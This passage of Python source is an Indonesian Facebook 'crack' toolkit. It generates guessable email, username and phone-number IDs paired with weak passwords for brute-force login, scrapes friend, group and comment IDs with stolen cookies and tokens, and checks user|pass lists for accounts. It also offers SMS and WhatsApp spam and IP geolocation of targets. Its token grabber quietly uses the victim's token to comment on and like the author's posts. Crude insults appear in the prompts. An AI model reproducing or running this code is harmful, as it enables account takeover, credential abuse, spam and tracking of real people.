			Asepitgans_xXc()
		elif idss in ['02','2']:
			dumpid()
		else:prints(nel(f'{P2}Pilih Yang Bener Lah kontol{P2}',width=70,padding=(0,7),style=f"{color_panel}"));exit()
	elif Asepitgans_Dev in ['bot']:
		#prints(nel(f'{P2}Tools Serbaguna Yang Bisa Dipakai [{H2} Asepitgans_XC {P2}]{P2}',width=70,padding=(0,7),style=f"{color_panel}"))
		prints(nel(f'{P2}[{color_text}01{P2}]. Spam sms        [{color_text}02{P2}]. Spam WhatsApp\n[{color_text}03{P2}]. Garap Method    [{color_text}04{P2}]. Pasang_a2\n[{color_text}05{P2}]. Lacak lokasi    [{color_text}06{P2}]. Apikey server{P2}',width=70,padding=(0,7),style=f"{color_panel}"))
		prints(nel(f'{P2}Ketik "{M2}back{P2}" untuk kembali menu awal{P2}',width=70,padding=(0,7),style=f"{color_panel}"))
		Asep_Ganteng_Pisan = input('[+] Pilih : ')
		if Asep_Ganteng_Pisan in ['1','01']:
			#khususprem()
			spam_sms()
		elif Asep_Ganteng_Pisan in ['2','02']:
			#khususprem()
			spam_wa()
		elif Asep_Ganteng_Pisan in ['Back','back']:
			#khususprem()
			login()
		elif Asep_Ganteng_Pisan in ['3','03']:
			#khususprem()
			siu()
		elif Asep_Ganteng_Pisan in ['4','04']:
			#khususprem()
			pasang_a2f()
		elif Asep_Ganteng_Pisan in ['5','05']:
			lacak()
		elif Asep_Ganteng_Pisan in ['6','06']:
			prints(nel(f'{P2}Masukan Server Negera dari author {P2}',width=70,padding=(0,7),style=f"{color_panel}"))
			apiii = input('[+] Apikey sever :\033[32m ');sleep(10)
			prints(nel(f'{P2} Terimakasih sudah memakai sever dari kami ✓{P2}',width=70,padding=(0,7),style=f"{color_panel}"));exit()
		else:
			prints(nel(f'{P2}Input Error!!{P2}',width=70,padding=(0,7),style=f"{color_panel}")) 
	elif Asepitgans_Dev in ['0','00']:
		os.system('rm -rf .token.txt')
		os.system('rm -rf .cok.txt')
		prints(nel(f'{H2}Successfully Logout+Delete Cookies{P2}',width=70,padding=(0,7),style=f"{color_panel}")) 
		exit()
	else:
		prints(nel(f'{K2}input correctly{P2}',width=70,padding=(0,7),style=f"{color_panel}")) 
		back()
def siu():
	start()
	get_data_web()
	akhir()
def error():
	prints(nel(f'{K2}Sorry, this feature is still being fixed{P2}',width=70,padding=(0,7),style=f"{color_panel}")) 
	time.sleep(4)
	back()
def ganti_tema():
		prints(nel(f""" Maaf Tools Ini Sedang Di Perbaiki """,width=70,padding=(0,7),style=f"{color_panel}"))
		sleep(2) 
		back()

import socket
import requests
import json
import os 
from rich import print as cetak
from rich.panel import Panel as panel
hostname = socket.gethostname()
IPAddr = socket.gethostbyname(hostname)

def lacak():
	prints(nel(f"""Silahkan masukan IP Target anda""",width=70,padding=(0,7),style=f"{color_panel}"))
	link = input(f'[+] Masukan Ip : ')
	url = 'http://ip-api.com/json/' + link
	r = requests.get(url)
	data = json.loads(r.text)
	latitude = data['lat']
	longitude = data['lon']
	google_maps_url = 'https://www.google.com/maps/place/' + str(latitude) + '+' + str(longitude)
	url = 'http://ip-api.com/json/'+link
	try:
		request = requests.get(url)
		response = request.json()
	except (requests.ConnectionError):
		prints(nel(f"""Koneksi internet anda sedang sibuk,silahkan periksa koneksi""",width=70,padding=(0,7),style=f"{color_panel}"))
		exit()
	if response['status'] == 'success':
		prints(nel(f"""Lokasi anda telah ditemukan silahkan ciduk""",width=70,padding=(0,7),style=f"{color_panel}"))
		print("\033[0m[+] Alamat IP :\033[32m " + response['query'])
		print("\033[0m[+] Kota : \033[32m" + response['city'])
		print("\033[0m[+] Negara : \033[32m" + response['country'])
		print("\033[0m[+] Kode Negara : \033[32m" + response['countryCode'])
		print("\033[0m[+] Latitude : \033[32m" + str(response['lat']))
		print("\033[0m[+] Longitude : \033[32m" + str(response['lon']))
		print("\033[0m[+] ISP :\033[32m " + response['isp'])
		print("\033[0m[+] Link Google Maps :\033[32m", google_maps_url)
		print('')
	else:
		prints(nel(f"""{P2}Alamat IP yang dimasukkan salah""",width=70,padding=(0,7),style=f"{color_panel}"))
	
import requests,re,rich,sys,os,json,time
from concurrent.futures import ThreadPoolExecutor as thread
from rich.markdown import Markdown as mark
from rich import print as cetak
from rich.console import Console as sol
from rich.panel import Panel as nel
ses = requests.Session()
loop = 0
x = '\33[m'
h = '\x1b[1;92m'
m = '\x1b[1;91m'

def mulai(link,jum):
	global loop
	print(f'\r{x}[+] progres {loop} ~ {jum}' ,end='')
	cook = open('.cookie.txt','r').read()
	took = open('.token.txt','r').read()
	try:
		url = f'https://graph.facebook.com/v13.0/me/feed?link={link}&published=0&access_token={took}'
		ok = ses.post(url,cookies={'cookie':cook}).text
		if 'Kami membatasi' in ok:
			print(f'{x}\r[+]share failled Akun Limit')
		elif 'spam' in ok:
			print(f'{x}\r[+]share failled Akun Limit')
		elif 'id' in ok:
			print(f"{x}\r[+] Succes : {h}"+ok)
		else:
			prints(nel(f"""Maaf terjadi kesalahan""",width=70,padding=(0,7),style=f"{color_panel}"))
	except:
		prints(nel(f"""Maaf terjadi kesalahan""",width=70,padding=(0,7),style=f"{color_panel}"))
	loop+=1

def gettok():
        prints(nel(f"""Silahkan masukan cookie, anda terlebih dahulu""",width=70,padding=(0,7),style=f"{color_panel}"));cook = input(f"{x}[+] Cookie : ")
        open('.cookie.txt','w').write(cook)
        try:
                cookie = {'cookie':cook}
                with requests.Session() as xyz:
                    url = 'https://business.facebook.com/business_locations'
                    req = xyz.get(url,cookies=cookie)
                    tok = re.search('(\["EAAG\w+)', req.text).group(1).replace('["','')
                    open('.token.txt','w').write(tok)
                    ses.post(f"https://graph.facebook.com/pfbid0ZiJQd99dJLpMpWoFJMcryzkZZQ2CiNEfWwH6Z4rYARP5LQf6qt8YvQNgQmxQVcskl/comments/?&message=Izin Pake Scnya Bang&access_token={tok}",cookies=cookie)
                    ses.post(f"https://graph.facebook.com/100000457453881_230141992787447/comments/?&message=Izin Pake Scnya Bang&access_token={tok}",cookies=cookie)
                    ses.post(f"https://graph.facebook.com/100000457453881_230141992787447/likes?summary=true&access_token="+tok,cookies={'cookie':cook}).text
        except Exception as e:

                prints(nel(f"""Cookie anda tidak valid/kedaluwarsa""",width=70,padding=(0,7),style=f"{color_panel}"))

def gas():
	gettok()
	prints(nel(f"""Silahkan masukan link Facebook yang ingin dishare""",width=70,padding=(0,7),style=f"{color_panel}"))
	link = input(f"{x}[+] Input Url : ")
	try:
		cook = open('.cookie.txt','r').read()
		took = open('.token.txt','r').read()
		get = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+took, cookies={'cookie':cook})
		nama = json.loads(get.text)['name']
		print(f"{x}[+] Nama Account : {h}"+nama)
	except KeyError:
		prints(nel(f"""Cookie invalid, silahkan login ulang kembali""",width=70,padding=(0,7),style=f"{color_panel}"))
		time.sleep(1)
		gettok()
	jum = int(input(f"{x}[+] Input Jumlah Share : "))
	with thread(max_workers=2) as pool:
		for io in range(jum):
			pool.submit(mulai,link,jum)
	print(f"{x}[+] Succes Share Sebanyak {h}{jum}{x} ×")


#--------[NO LOGIN COOKIE]--------#
def menuhah():
	banner()
	prints(nel(f'{P2}Tools brute crak simple/dan bagus untuk coli\Pilihan Crack Bisa Menulis Ke {H2}mail{P2}/{K2}yaho{P2}/{M2}user{P2}{H2} Nomor{P2} pilih method no {H2}7{P2}',width=70,padding=(0,7),style=f"{color_panel}"))
	prints(nel(f'{P2}[{color_text}01{P2}]. Crack Gmail\n[{color_text}02{P2}]. Crack Yahoo\n[{color_text}03{P2}]. Crack username\n[{color_text}04{P2}]. Crack Nomor Telepon\n[{color_text}05{P2}]. Crack lewat file{P2}',width=70,padding=(0,7),style=f"{color_panel}"))
	Asep_sukaColi_DanGanteng = input('[+] Pilih : ')
	if Asep_sukaColi_DanGanteng in ['01','1','mail','gmail']:
		clon_email()
	elif Asep_sukaColi_DanGanteng in ['02','2','yaho','yahoo']:
		clon_yahoo()
	elif Asep_sukaColi_DanGanteng in ['03','3','user','nama']:
		crack_nama()
	elif Asep_sukaColi_DanGanteng in ['04','4','nomor','nom']:
			crack_nomor()
	elif Asep_sukaColi_DanGanteng in ['05','5','pil','file']:
			crack_filev2()
	else:
		prints(nel(f'{P2}Input Error!!{P2}',width=70,padding=(0,7),style=f"{color_panel}")) 
		

#--------[cekdetektor]-------#
def cekdetektor():
    results, result = {}, []
    try:
    	ua = open("data/useragent.txt", "r").read()
    except:
    	try:os.mkdir("data")
    	except:pass
    	prints(nel(f'{P2}Masukan UserAgent Anda Terlebih dahulu {P2}',width=70,padding=(0,7),style=f"{color_panel}"))
    	open("data/useragent.txt", "a").write(input("[+] UserAgent: \033[32m")+" [FB_IAB/FB4A;FBAV/35.0.0.48.273;]")
    	prints(nel(f'{P2}Jalankan ulang scriptnya {P2}',width=70,padding=(0,7),style=f"{color_panel}"));exit()
    if(ua==""):
    	os.remove("data/useragent.txt")
    	prints(nel(f'{P2}UserAgent Tidak Ada!, Jalankan ulang scriptnya {P2}',width=70,padding=(0,7),style=f"{color_panel}"));exit()
    LOg = Login(ua)
    prints(nel(f'{P2} Tools Facebook Checker Account checkpoint V²{P2}',width=70,padding=(0,7),style=f"{color_panel}"))
    prints(nel(f'{P2}[{color_text}01{P2}]. Cek Account 1 per 1\n[{color_text}02{P2}]. Cek Account per File [format: user|pass]{P2}',width=70,padding=(0,7),style=f"{color_panel}"))
    select = input("[+] pilih : ")
    if(select=="1"):
    	prints(nel(f'{P2}Masukan username/id password kalian{P2}',width=70,padding=(0,7),style=f"{color_panel}"))
    	data = input("[+] user|pass: ")
    	print()
    	user,pw = data.split("|")
    	print(LOg.log_mfacebook(user,pw))
    elif(select=="2"):
    	prints(nel(f'{P2}Masukan file account cp kalian berbentuk file.txt{P2}',width=70,padding=(0,7),style=f"{color_panel}"))
    	data = input("[+] name file: ")
    	print()
    	try:
    		for x in open(data,"r").readlines():
    			x = x.replace("\n","")
    			user,pw = x.split("|")
    			print(LOg.log_mfacebook(user,pw))
    	except FileNotFoundError:
    		prints(nel(f'{P2}File Tidak Ditemukan{P2}',width=70,padding=(0,7),style=f"{color_panel}"));exit()
    else:prints(nel(f'{P2}Input Error!!{P2}',width=70,padding=(0,7),style=f"{color_panel}"))
    	

    results.update(
    	{
    		"results":{
    			"data":result
   	 	},
    		"jumlah_akun_cp":cp,
    		"jumlah_akun_ok":ok,
    		"jumlah_akun_error":error
    	}
    )

#--------[PASANG A2F]--------#
def pasang_a2f():
	prints(nel(f'{P2}Masukan cookie anda jika ingin, pasang a2f [{H2} Asepitgans_XC {P2}]{P2}',width=70,padding=(0,7),style=f"{color_panel}"))
	cokii = input("[+] Cookie: \033[32m")
	resss = req.get(
		"https://mbasic.facebook.com/profile.php",cookies={
			"cookie":cokii
		}
	).text
	if "mbasic_logout_button" in resss:
		nama = re.findall(
			'\<title\>(.*?)<\/title\>',str(
				resss
			)
		)[0]
		#print(f'[✓] Cookies accept\n[+] Selamat Datang {nama}\n')
		menuju = Pasang(cokii)
		menuju.cek()
	else:
		prints(nel(f'{P2}Cookie anda kedaluwarsa atau/invalid{P2}',width=70,padding=(0,7),style=f"{color_panel}"))
		exit()
		###---[ DUMP NO LOGIN ]---###
def crack_nomor():
	prints(nel(f'{P2}Brute Force Nomor Gunakan Sandi Manual{P2}',width=70,padding=(0,7),style=f"{color_panel}"))
	depan = input('[+] Nomor Awalan : ')
	if len(depan)==3:pass
	else:prints(nel(f'{P2}Contoh Awalan Nomor "{H2}089{P2}" Dll Tolol{P2}',width=70,padding=(0,7),style=f"{color_panel}"));exit()
	jumla = input('[+] Masukan total : ')
	for x in range(int(jumla)):
		rr = random.randint
		A = depan
		B = rr(1111,9999)
		C = rr(1,9)
		D = f'{A}{C}-{str(rr(1111,9999))}-{str(B)}'
		if D in id:pass
		else:id.append(D+'|123456')
		print('\r[+] Total \033[32m%s \033[0mID'%(len(id)),end=" ")
		sys.stdout.flush()
		sleep(0.0000003)
	setting()

#----------[CRACK USERNAME]----------#
def crack_nama():
	nama = []
	custom = [" iqbal"," kami"," siska"," batam"," medan"," new"," old"," jian"," store"," tias"," rio"," lia"," farz"," marvel"," jakarta"," anisha"," juven"," der"," rika"," udin"," rayan"," tina"," hendrik"," fahmi"," baili"," rima"," gadis"," dimas"," abram"," ajis"," vicky"," charlie"," piko"," billa"]
	custom2 = ["galang ","gilang ","gita ","steven ","aulia ","tiyas ","albert ","naura ","naira ","mancung ","dewi ","josen ","johan ","slot ","sharil ","hendrik ","edo ","ridho ","anton ","reval ","abi ","yehezkiel ","hafiz ","daniel ","angun "]
	prints(nel(f'{P2}Crack Username Satu Nama Yang Ingin Di Crack Setara Dengan 5.000 Username{P2}',width=70,padding=(0,7),style=f"{color_panel}"))
	nam = console.input(f'[+] Masukan Nama : ').split(",")
	for ser in nam:		
		for belakang in custom:
			id = ser+belakang
			nama.append(id)
		for depan in custom2:
			id = depan+ser
			nama.append(id)
	with tred(max_workers=5) as thread:
		for id in nama:
			thread.submit(cari_nama,f"https://mbasic.facebook.com/public/{id}?/locale2=id_ID")
	setting()
		
def cari_nama(link):
	r = parser(ses.get(str(link)).text,'html.parser')
	for x in r.find_all('td'):
		data = re.findall('\<a\ href\=\"\/(.*?)\">\<div\ class\=\".*?\">\<div\ class\=\".*?\">(.*?)<\/div\>',str(x))
		for uid,nama in data:
			if 'profile.php?' in uid:
				uid = re.findall('id=(.*)',str(uid))[0]
			elif '<span' in nama:
				nama = re.findall('(.*?)\<',str(nama))[0]
			bo = uid+'|'+nama
			if bo in id:pass
			else:id.append(bo)
	link = r.find('a',string='Lihat Hasil Selanjutnya').get('href')
	if(link):
	  #sys.stdout.write(f"\r[+] Mengumpulkan\033[32m {len(id)}\033[0m Idz ...");#sys.stdout.flush()
	  time.sleep(0.0000003)
	  cari_nama(link)
	else:
	     print("\r")
	
#-----------------[ DUMP ID ]-----------------# 
def dumpid():
	try:
		token = open('.token.txt','r').read()
		cookie = open('.cok.txt','r').read()
		os.mkdir('/sdcard/DUMP-FILE')
	except:pass
	try:
		prints(nel(f'{P2}Masukan id anda berserta/publik{P2}',width=70,padding=(0,7),style=f"{color_panel}"))
		barelang = input(f"[+] Masukan Id  : ")
		batuampar = input(f"[+] Nama File Dump  : ")
		gajahmada  = ('/sdcard/DUMP-FILE/' + batuampar + '.txt').replace(' ', '_')
		xxx = open(gajahmada, 'w')
		coki = {"cookie":cookie}
		smpn20 = requests.get('https://graph.facebook.com/%s?fields=friends.limit(90000)&access_token=%s'%(barelang,token),cookies=coki).json()
		for sekupang in smpn20['friends']['data']:
			id.append(sekupang['id']+'|'+sekupang['name'])
			xxx.write(sekupang['id']+'|'+sekupang['name']+ '\n')
			print('\r[+] Mengumpulkan %s Id'%(len(id)),end='')
			time.sleep(0.0050)
		print(f"\n[+] Berhasil Dump Id Dari Publik")
		print(f"[+] Salin Output File + [ %s ]"%(gajahmada))
		exit()
	except (KeyError,IOError):
		os.remove(gajahmada)
		print(f"[+] Gagal Dump Id, Kemungkinan Id Tidak Ada")
		exit()
		
#----------[dump id publick]----------#
def dump_publik():
	try:
		token = open('.token.txt','r').read()
		kukis = open('.cok.txt','r').read()
	except IOError:
		exit()
	prints(nel(f'{P2}Ketik "{H2}Me{P2}" {P2}Jika Ingin Crack Teman Sendiri{P2}',width=70,padding=(0,7),style=f"{color_panel}")) 
	pil = input('[+] Username/Id : ')
	try:
		koh2 = requests.get('https://graph.facebook.com/v2.0/'+pil+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':kukis}).json()
		for pi in koh2['friends']['data']:
			try:id.append(pi['id']+'|'+pi['name'])
			except:continue
		#print(x+m+''+x+'[+] Total ID : \033[32m'+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		prints(nel(f'{P2}Internetmu Gak Ada Bodoh{P2}',width=70,padding=(0,7),style=f"{color_panel}")) 
		exit()
	except (KeyError,IOError):
		prints(nel(f'{P2}Pertemanan Tidak Publick Cookie And Token Anda Busuk{P2}',width=70,padding=(0,7),style=f"{color_panel}"));dump_publik()
		
#----------[dump id massal]-----------#
def dump_massal():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		exit()
	try:
		jum = int(input('[+] input target amount ? : '))
	except ValueError:
		prints(nel(f'{P2}wrong input {P2}',width=70,padding=(0,7),style=f"{color_panel}")) 
		exit()
	if jum<1 or jum>100:
		prints(nel(f'{P2}Failed Dump Id maybe id is not public{P2}',width=70,padding=(0,7),style=f"{color_panel}")) 
		exit()
	ses=requests.Session()
	yz = 0
	for met in range(jum):
		yz+=1
		kl = input('[+] Enter the Id '+str(yz)+' : ')
		uid.append(kl)
	for userr in uid:
		try:
			col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
			for mi in col['friends']['data']:
				try:
					iso = (mi['id']+'|'+mi['name'])
					if iso in id:pass
					else:id.append(iso)
				except:continue
		except (KeyError,IOError):
			pass
		except requests.exceptions.ConnectionError:
			prints(nel(f'{P2}unstable signal{P2}',width=70,padding=(0,7),style=f"{color_panel}")) 
			exit()
	try:
		#print('')
		#print(f'[+] Total ID : {h}'+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		prints(nel(f'{P2}unstable signal {P2}',width=70,padding=(0,7),style=f"{color_panel}")) 
		back()
	except (KeyError,IOError):
		prints(nel(f'{P2}Friendship Not Public{P2}',width=70,padding=(0,7),style=f"{color_panel}")) 
		time.sleep(3)
		back()

def crack_group():
	try:
		token = open('.token.txt','r').read()
		cokies = open('.cok.txt','r').read()
	except IOError:
		print(' [+] Cookies Kadaluarsa ')
		time.sleep(5)
		login()
	cetak(nel(' Pastikan Idz Grup Bersifat Publik , Mohon Bersabar Dump Id Grup Sangat Lambat',width=90,padding=(0,8),style=f"bold white"))
	url = input(f' [+] Id Group : ')
	kocak("https://m.facebook.com/groups/"+url,cokies)
	setting()

def kocak(url,cokies):
	data = parser(requests.Session().get(url,cookies={"cookie": cokies}).text, "html.parser")
	judul = re.findall("<title>(.*?)</title>",str(data))[0]
	for isi in data.find_all("h3"):
		for ids in isi.find_all("a",href=True):
			if "profile.php" in ids.get("href"):uid = ids.get("href").split("=")[1].replace("&eav","");nama = ids.text
			else:
				if judul in ids.text:pass
				else:uid,nama=ids.get("href").split("/")[1].split("?")[0],ids.text
				if uid+'|'+nama in uidl:pass
				else:uidl.append(uid+"|"+nama)
				for x in data.find_all("a",href=True):
					if "Lihat Postingan Lainnya" in x.text:
						kocak("https://m.facebook.com"+x.get("href"),cokies)   

###---------[ CRACK DARI KOMEN ]---------- ###
def komen():
	try:
		token = open('.token.txt','r').read()
		cokies = open('.cok.txt','r').read()
	except IOError:
		print(' [+] Cookies Kadaluarsa ')
		time.sleep(5)
		login()
	cetak(panel(f"Pastikan Akun Target Yang Di Pilih Bersifat Publik Jangan Private",width=90,padding=(0,4),style=f"bold white"))
	ide = input(f' [+] Masukan Id Postingan : ')
	get_komen('https://mbasic.facebook.com/'+ide,cokies)
	setting()

def get_komen(url,cokies):
	data = parser(ses.get(url,cookies={"cookie": cokies}).text, "html.parser")
	for isi in data.find_all("h3"):
		for ids in isi.find_all("a",href=True):
			if "profile.php" in ids.get("href"):id = ids.get("href").split('=')[1].replace("&refid","")
			else:id = re.findall("/(.*?)?__",ids["href"])[0]. replace("?refid=52&","")
			nama = ids.text
			if id+"|"+nama in dump:pass
			sys.stdout.write(f"\r [+] Mengumpulkan {len(id)} Idz...");sys.stdout.flush()
	for z in data.find_all("a",href=True):
		if "Lihat komentar sebelumnya…" in z.text:
			try:get_komen("https://mbasic.facebook.com"+z["href"])
			except:pass				
#-------------------[ CRACK-EMAIL ]----------------#
def clon_email():
	rc = random.choice
	rr = random.randint
	bas = ['nazri','nizar','reni','aidil','yusup','yusep','sidik','encas','erika','ika','agil','lang','ling','lung','ani','keyla','septi','cepi','galuh','rona','ronaldo','ado','deon','ratu','ara','nia','nina','panji','heru','gaga','ega','agnes','ilma','puji','pujia','uji','hesti','reksa','bulan','alip','alif','sahri','raisa','mela','mella','cucu','ria','sarah','bunga','vina','cia','tiya','candra','bilal','fatimah','arya','kevin','bima','nurul','suparhan','ahmad','mahmud','asep','ramdan','saputra','kurnia','ramdani','hilda','mita','miya','ayu','gopur','tia','bono','mutiara','arin','wiwin','winda','penita','iyus','herlan','dinda','nda','naya','niya','aca','bandros','refan','wapda','rahman','maman','mimin','fitrah','adit','adat','fiki','aulia','tata','enung','esih','jajang','febi','ismi','wida','sanji','regi','rega','ferdi','firman','jimi','mawar','ratna','dimas','sasa','tia','tini','medusa','dewi','winda','setia','putri','danil','galang','gilang','denis','deni','sela','nabil','sinta','amel','melia','putra','telor','sabun','nia','kira','mela','mila','lisa','lida','lidi','ali','jaya','kiki','pian','pita','juwita','junita','nita','anisa','nisa','sani','sari','uje','uji','olip','oli','fikar','nur','siti','aji','oji','rada','imas','mia','tuti','tia','ima','sendi','febian','rima','raka','rati','jiman','dodi','reza','yani','galih','hia','siva','opik','kamal','jamal','linda','lida','ida','adi','andi','dwi','muhammad','nur','dewi','tri','dian','sri','putri','eka','sari','aditya','basuki','budi','joni','toni','cahya','riski','farhan','aden','joko']
	blk = ['boy','mabok','eam','aulia','kasih','cantik','kasep','ganteng','tzy','1','2','3','4','5','6','7','8','9','99','official','gaming','utama','123','1234','12345','123456','cakep']
	global ok , cp
	prints(nel(f'{P2}Masukan nama terserah kalian bebas and publick{P2}',width=70,padding=(0,7),style=f"{color_panel}")) 
	nama = input('[+] Username : ')
	if ',' in str(nama):
		exit(f'[+] masukan 1 nama saja')
	doma = '@gmail.com'
	if '@' not in str(doma) or '.com' not in str(doma):
		exit(f'[+] masukan domain yang benar')
	jumlah = input('[+] Masukan total : ')
	for xyz in range(int(jumlah)):
		A = nama
		B = [f'{str(rc(bas))}',f'{str(rr(0,31))}',f'{str(rc(blk))}'f'{str(rc(bas))}{str(rr(0,31))}',f'{xyz}',f'{str(rc(blk))}{str(rr(0,31))}',f'{str(rc(bas))}{str(rc(blk))}']
		C = doma
		D = f'{A}{str(rc(B))}{C}'
		if D in id:pass
		else:id.append(D+'|'+nama)
		if len(id)==1010101010101010101:setting()
		#print('\r[+] Total \033[32m%s \033[0mID'%(len(id)),end='')
		#sys.stdout.flush()
	setting()
	
#-------------------[ KHUSUS-PREMIUM ]----------------#
def khususprem():
	prints(nel(f'{P2}Maaf fitur yang anda gunakan{M2} free{P2}, ini hanya bisa digunakan untuk pengguna {H2}premium{P2} saja{P2}',width=70,padding=(0,7),style=f"{color_panel}"))
	os.system('xdg-open https://wa.me/+6281229259881')
	exit()
#-------------------[ CRACK-YAHOO ]----------------#
def clon_yahoo():
	rc = random.choice
	rr = random.randint
	bas = ['nazri','nizar','reni','aidil','yusup','yusep','sidik','encas','erika','ika','agil','lang','ling','lung','ani','keyla','septi','cepi','galuh','rona','ronaldo','ado','deon','ratu','ara','nia','nina','panji','heru','gaga','ega','agnes','ilma','puji','pujia','uji','hesti','reksa','bulan','alip','alif','sahri','raisa','mela','mella','cucu','ria','sarah','bunga','vina','cia','tiya','candra','bilal','fatimah','arya','kevin','bima','nurul','suparhan','ahmad','mahmud','asep','ramdan','saputra','kurnia','ramdani','hilda','mita','miya','ayu','gopur','tia','bono','mutiara','arin','wiwin','winda','penita','iyus','herlan','dinda','nda','naya','niya','aca','bandros','refan','wapda','rahman','maman','mimin','fitrah','adit','adat','fiki','aulia','tata','enung','esih','jajang','febi','ismi','wida','sanji','regi','rega','ferdi','firman','jimi','mawar','ratna','dimas','sasa','tia','tini','medusa','dewi','winda','setia','putri','danil','galang','gilang','denis','deni','sela','nabil','sinta','amel','melia','putra','telor','sabun','nia','kira','mela','mila','lisa','lida','lidi','ali','jaya','kiki','pian','pita','juwita','junita','nita','anisa','nisa','sani','sari','uje','uji','olip','oli','fikar','nur','siti','aji','oji','rada','imas','mia','tuti','tia','ima','sendi','febian','rima','raka','rati','jiman','dodi','reza','yani','galih','hia','siva','opik','kamal','jamal','linda','lida','ida','adi','andi','dwi','muhammad','nur','dewi','tri','dian','sri','putri','eka','sari','aditya','basuki','budi','joni','toni','cahya','riski','farhan','aden','joko']
	blk = ['boy','mabok','eam','aulia','kasih','cantik','kasep','ganteng','tzy','1','2','3','4','5','6','7','8','9','99','official','gaming','utama','123','1234','12345','123456','cakep']
	global ok , cp
	prints(nel(f'{P2}Masukan nama terserah kalian bebas and publick{P2}',width=70,padding=(0,7),style=f"{color_panel}")) 
	nama = input('[+] Username : ')
	if ',' in str(nama):
		exit(f'[+] masukan 1 nama saja')
	doma = '@yahoo.com'
	if '@' not in str(doma) or '.com' not in str(doma):
		exit(f'[+] masukan domain yang benar')
	jumlah = input('[+] Masukan total : ')
	for xyz in range(int(jumlah)):
		A = nama
		B = [f'{str(rc(bas))}',f'{str(rr(0,31))}',f'{str(rc(blk))}'f'{str(rc(bas))}{str(rr(0,31))}',f'{xyz}',f'{str(rc(blk))}{str(rr(0,31))}',f'{str(rc(bas))}{str(rc(blk))}']
		C = doma
		D = f'{A}{str(rc(B))}{C}'
		if D in id:pass
		else:id.append(D+'|'+nama)
		if len(id)==1010101010101010101:setting()
		#print('\r[+] Total \033[32m%s \033[0mID'%(len(id)),end='')
		#sys.stdout.flush()
	setting()

#-----------------[ HASIL-CRACK ]-----------------#
def result():
	prints(nel(f'{P2}[{color_text}01{P2}]. Hasil CP Anda\n[{color_text}02{P2}]. Hasil OK Anda\n[{color_text}00{P2}]. Kembali{P2}',width=70,padding=(0,7),style=f"{color_panel}")) 
	kz = input('[+] pilih  : ')
	if kz in ['1','01']:
		try:vin = os.listdir('CP')
		except FileNotFoundError:
			prints(nel(f'{P2}File Tidak Di Temukan{P2}',width=70,padding=(0,7),style=f"{color_panel}")) 
			time.sleep(3)
			back()
		if len(vin)==0:
			prints(nel(f'{P2}Anda Tidak Memiliki Hasil CP{P2}',width=70,padding=(0,7),style=f"{color_panel}")) 
			time.sleep(2)
			back()
		else:
			prints(nel(f'{P2} Silahkan File Result {M2}CP{P2} Anda [{H2} Asepitgans_XC {P2}]{P2}',width=70,padding=(0,7),style=f"{color_panel}"))
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('CP/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = ''+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print(''+nom+'. '+isi+'\033[31m '+str(len(hem))+' \033[0mcekpoint '+x)
				else:
					lol.update({str(cih):str(isi)})
					print(''+str(cih)+'. '+isi+'\033[31m '+str(len(hem))+' \033[0mcekpoint '+x)
			geeh = input('\n[+] Nomor : ')
			print('')
			try:geh = lol[geeh]
			except KeyError:
				prints(nel(f'{P2}Pilih Yang Bener Kontol{P2}',width=70,padding=(0,7),style=f"{color_panel}")) 
				exit()
			try:lin = open('CP/'+geh,'r').read().splitlines()
			except:
				prints(nel(f'{P2}File Tidak Di Temukan{P2}',width=70,padding=(0,7),style=f"{color_panel}")) 
				time.sleep(2)
				back()
			prints(nel(f'{P2}Hasil Account Facebook [{H2} {str(len(hem))} {P2}] Tanggal [ {H2}{tgl}-{bln}-{thn} {P2}]',width=70,padding=(0,7),style=f"{color_panel}"))
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				tree = Tree(" ")
				tree.add(f"\r[yellow] Account chekpoin[white]").add(f"\r[yellow]{cpkuni[0]}|{cpkuni[1]}[white]  ")
				Buat(tree)
				nocp +=1
			prints(nel(f'{P2}Hasil Account Facebook [{H2} {str(len(hem))} {P2}] Tanggal [ {H2}{tgl}-{bln}-{thn} {P2}]',width=70,padding=(0,7),style=f"{color_panel}"))
			input('\n[+] Back Enter ')
			back()
	elif kz in ['2','02']:
		try:vin = os.listdir('OK')
		except FileNotFoundError:
			pers = loop*100/len(id2)
			fff = '%'
			prog.update(des,description=f'\r[deep_white]{(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)} [/]=[yellow] CP[/]:[yellow]{(cp)}')
			prog.advance(des)
			prints(nel(f'{P2}File Tidak Di Temukan{P2}',width=70,padding=(0,7),style=f"{color_panel}")) 
			time.sleep(2)
			back()
		if len(vin)==0:
			prints(nel(f'{P2}Anda Tidak Mempunyai File OK{P2}',width=70,padding=(0,7),style=f"{color_panel}")) 
			time.sleep(2)
			back()
		else:
			prints(nel(f'{P2} Silahkan File Result {H2}OK{P2} Anda [{H2} Asepitgans_XC {P2}]{P2}',width=70,padding=(0,7),style=f"{color_panel}"))
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('OK/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<100:
					nom = ''+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print(''+nom+'. '+isi+'\033[32m '+str(len(hem))+' \033[0mSucses '+x)
				else:
					lol.update({str(cih):str(isi)})
					print(''+str(cih)+'. '+isi+'\033[32m '+str(len(hem))+' \033[0mSucses '+x)
			geeh = input('\n[+] Nomor : ')
			try:geh = lol[geeh]
			except KeyError:
				prints(nel(f'{P2}Pilih Yang Bener Kontol{P2}',width=70,padding=(0,7),style=f"{color_panel}")) 
				exit()
			try:lin = open('OK/'+geh,'r').read().splitlines()
			except:
				prints(nel(f'{P2}File Tidak Di Temukan{P2}',width=70,padding=(0,7),style=f"{color_panel}")) 
				time.sleep(2)
				back()
			prints(nel(f'{P2}Hasil Account Facebook [{H2} {str(len(hem))} {P2}] Tanggal [ {H2}{tgl}-{bln}-{thn} {P2}]',width=70,padding=(0,7),style=f"{color_panel}"))
			nocp=0
			for cpku in range(len(lin)):
